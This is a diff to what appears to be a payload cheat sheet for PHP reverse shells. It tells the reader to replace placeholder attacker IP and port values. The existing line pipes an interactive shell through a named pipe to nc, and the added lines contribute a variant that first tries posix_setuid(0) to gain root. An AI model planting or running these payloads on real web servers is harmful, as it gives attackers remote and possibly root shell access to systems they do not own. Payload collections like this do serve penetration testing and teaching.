@@ -10,6 +10,12 @@ Replace `${ATTACKER_IP}` and `${ATTACKER_LISTENER_PORT}` below:
 <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${ATTACKER_IP} ${ATTACKER_LISTENER_PORT} >/tmp/f");?>
 ```
 
+Or with setuid:
+
+```
+<?php @posix_setuid(0); system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${ATTACKER_IP} ${ATTACKER_LISTENER_PORT} >/tmp/f"); ?>
+```
+
 e.g.
 
 ```
